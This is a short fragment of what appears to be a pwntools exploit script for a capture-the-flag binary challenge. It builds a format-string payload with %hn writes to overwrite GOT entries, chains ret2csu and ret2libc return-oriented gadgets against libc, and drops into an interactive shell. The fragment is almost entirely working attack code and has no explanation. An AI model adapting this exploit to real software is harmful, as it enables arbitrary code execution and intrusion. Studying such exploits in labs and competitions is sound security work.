...
payload+=(f"%{((libc.address+0x00000000020000) + 0x0a6 &0x00000000ffff)}c%16$hn")
# payload+="aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaa"
payload+="AAA"
payload=payload.encode('utf-8')
payload+=p(0)
payload+=p(libc.address+0x0000000005b8a7)
...
sleep(5)
sla(b"So... tell me a little about yourself: ", (p(exe.got.exit) + p(exe.got.exit+2) + p(0x2) + ret2csu(what=exe.got.read, rdi=0, rsi=exe.bss(0x900  - 8), rdx=0x1337) + ret2libc("puts", libc.address+0x1b45bd)))
sleep(5)
io.interactive()
